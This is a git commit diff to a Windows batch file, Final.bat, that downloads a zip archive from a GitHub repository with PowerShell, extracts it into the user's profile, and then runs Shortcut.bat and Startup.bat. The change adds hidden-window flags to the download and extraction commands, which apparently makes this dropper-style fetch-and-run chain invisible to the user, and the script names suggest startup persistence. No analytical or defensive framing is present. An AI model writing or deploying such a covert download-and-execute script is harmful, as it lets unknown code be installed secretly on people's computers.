c92ababb72388b783e7e0cea93addd3fb6e9adab
peasiodjoaskdsa <140851719+peasiodjoaskdsa@users.noreply.github.com>
2023-12-09 18:42:45 +0100

    Add files via upload

--- Final.bat
+++ Final.bat
@@ -1,7 +1,7 @@
 @echo off
-PowerShell.exe -Command "Invoke-WebRequest -Uri https://github.com/peasiodjoaskdsa/mor/raw/main/ms.zip -OutFile '%USERPROFILE%\ms\ms.zip'"
+PowerShell.exe -WindowStyle hidden -Command "Invoke-WebRequest -Uri https://github.com/peasiodjoaskdsa/mor/raw/main/ms.zip -OutFile '%USERPROFILE%\ms\ms.zip'"
 timeout /t 40 /nobreak
-PowerShell.exe -Command "Expand-Archive -Path '%USERPROFILE%\ms\ms.zip' -DestinationPath '%USERPROFILE%\ms' -Force"
+PowerShell.exe -WindowStyle hidden -Command "Expand-Archive -Path '%USERPROFILE%\ms\ms.zip' -DestinationPath '%USERPROFILE%\ms' -Force"
 start "" Shortcut.bat
 timeout /t 5/nobreak
 start "" Startup.bat
